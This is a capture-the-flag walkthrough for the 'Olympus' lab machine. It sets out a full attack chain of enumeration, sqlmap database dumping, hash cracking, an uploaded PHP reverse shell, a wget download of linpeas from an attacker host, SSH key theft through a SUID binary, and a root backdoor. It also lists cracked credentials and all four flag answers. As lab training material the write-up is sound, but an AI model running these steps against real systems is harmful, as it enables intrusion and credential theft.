# Olympus - Medium

```shell
nmap -T4 -p- -A -Pn -v olympus.thm

feroxbuster -u http://olympus.thm -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,404,405,500

#subdomain enum
sudo wfuzz -c -f sub-fighter -u "http://olympus.thm" -H "Host: FUZZ.olympus.thm" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50

#add 0 char filter
sudo wfuzz -c -f sub-fighter -u "http://olympus.thm" -H "Host: FUZZ.olympus.thm" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 --hh 0

cmseek

#check for sqli in webpage
#save burp suite request

sqlmap -r olympus.req --dbs

sqlmap -r olympus.req -D olympus --dump-all

hashcat -a 0 -m 3200 unsaltedhash.txt /usr/share/wordlists/rockyou.txt

#login to the subdomain found
#send reverse shell on chat

sqlmap -r olympus.req -D olympus --dump -T chats --fresh-queries
#updated chats table
#includes random name for php shell file

nc -nvlp 4444
#setup listener
#we get reverse shell by visiting the randomly named file on uploads folder

id
#www-data

python3 -c 'import pty;pty.spawn("/bin/bash")'

cd /tmp

#setup python http server in attacker machine

wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

ls -la /usr/bin/cputils

/usr/bin/cputils
#copies a file to another file

ls -la /home/zeus
#this has a .ssh directory
#we can copy private key

/usr/bin/cputils
#copy zeus SSH private key

cat key
#copy private key to attacker machine

#in attacker machine
vim id_rsa

chmod 600 id_rsa

ssh2john id_rsa > hash_id_rsa

john --wordlist=/usr/share/wordlists/rockyou.txt hash_id_rsa
#cracks passphrase

ssh zeus@olympus.thm -i id_rsa
#login as zeus

cat user.flag
#flag 2

#use linpeas.sh again for privesc

ls -la /var/www/html

cd /var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc

ls -la

cat VIGQFQFMYOST.php
#program for root reverse shell
#analyse source code

#run mentioned binary
/lib/defended/libc.so.99

#this gives root shell
cd /root

#get flag 3

cd /etc

grep -irl "flag{"
#get flag 4
```

* Open ports & services:

  * 22 - ssh - OpenSSH 8.2p1 (Ubuntu)
  * 80 - http - Apache httpd 2.4.41

* We can begin by enumerating the webpage on port 80.

* The website is still under development, and we are told to look for the old version of the website - we can do so by directory enum using ```feroxbuster```, and subdomain enum using ```wfuzz```.

* ```feroxbuster``` gives us directories /static and /~webmaster

* ```wfuzz``` does not give any subdomains.

* The /~webmaster page seems to be a blog page, running on some CMS - we can check this using ```cmseek```.

* ```cmseek``` fails to give us anything, so we have to manually check for any vulnerabilities in the webpage.

* Now, checking for SQL injection in the search function, we can simply insert an apostrophe (') as input.

* This gives an SQL error - therefore, SQLi is a possibility.

* Using Burp Suite, we can capture this request and save it to a file, and feed it as input for ```sqlmap```.

* With the help of the ```--dbs``` flag, we get a list of all the MySQL databases; we can go further and dump all contents of the ```olympus``` database.

* This dumps contents of 6 tables:

  * categories
  * users
  * posts
  * chats
  * comments
  * flag

* The flag table contains our first flag.

* The key contents of user table are username, salt and hash.

* Going through the other tables, we get to know some more context about uploads and common passwords.

* We can now attempt to crack the given hashes using ```hashcat```.

* The hashes are of type ```bcrypt, Blowfish```, so we have to use the required mode.

* We are able to crack the unsalted hash and we get the creds "prometheus:summertime"

* We are unable to crack the salted hashes so we will skip them for now.

* Using prometheus creds, we can log into the blog page.

* This gives us access to the Admin Page.

* Going through the contents of the Admin Page, we can see that in Users Page, some users are having email domain 'chat.olympus.thm' - this means there exists a subdomain 'chat'.

* We can add this to our /etc/hosts file then.

* Visiting the website <http://chat.olympus.thm>, we have to login using prometheus creds before proceeding.

* Now, this chat shows that there is upload folder, but the filename is randomized upon uploading.

* We can attempt to send files on the chat, such as the PHP reverse shell file.

* We can confirm this by running ```feroxbuster```, we have a /uploads directory, but it does not show anything.

* Now, checking the tables from the ```olympus``` database again using ```sqlmap```, along with the flag ```--fresh-queries```, we can see some changes.

* Notably, in the 'chats' table, we can see that we have our PHP shell sent earlier, and this also includes the randomised name.

* By navigating to <http://chat.olympus.thm/uploads/random-shell-name.php>, and setting up listener, we will get reverse shell.

* We are now 'www-data', we can begin enumeration using ```linpeas```.

* This points out a file with SUID bit set, called ```/usr/bin/cputils``` - using ```ls```, we can see that this is owned by 'zeus'.

* Running the binary, we can see that it is used to copy source file to a target file.

* Therefore, we can attempt to copy zeus private SSH key, so that we can log into SSH as zeus.

* This can be done by running ```/usr/bin/cputils```, and feeding the path ```/home/zeus/.ssh/id_rsa```, when it asks for the source file.

* Now, after getting the private key for zeus, we can copy its contents to our machine.

* Using ```ssh2john```, we can generate a hash for the same and crack it using ```john```, this gives us the passphrase 'snowflake'.

* We can log into SSH as zeus using the private key now, and get flag 2 from zeus home directory.

* Now, we can again use ```linpeas.sh``` for checking privesc routes.

* ```linpeas``` does not show anything, so we can start manually enumerating directories.

* Checking the '/var/www/html' folder, we can see that there is a randomly named folder.

* Checking its contents, we have two files - the .php file is not empty.

* Printing the contents of the .php file shows that it is a program for 'reverse root shell backdoor'.

* Moreover, it contains the binary "/lib/defended/libc.so.99", which is run, following which root shell is obtained.

* If we run this binary, we will get a root shell successfully.

* We can get flag 3 from /root directory.

* For flag 4, we need to search /etc directory for flag using ```grep```.

```markdown
1. What is Flag 1? - flag{Sm4rt!_k33P_d1gGIng}

2. What is Flag 2? - flag{Y0u_G0t_TH3_l1ghtN1nG_P0w3R}

3. What is Flag 3? - flag{D4mN!_Y0u_G0T_m3_:)_}

4. What is Flag 4? - flag{Y0u_G0t_m3_g00d!}
```
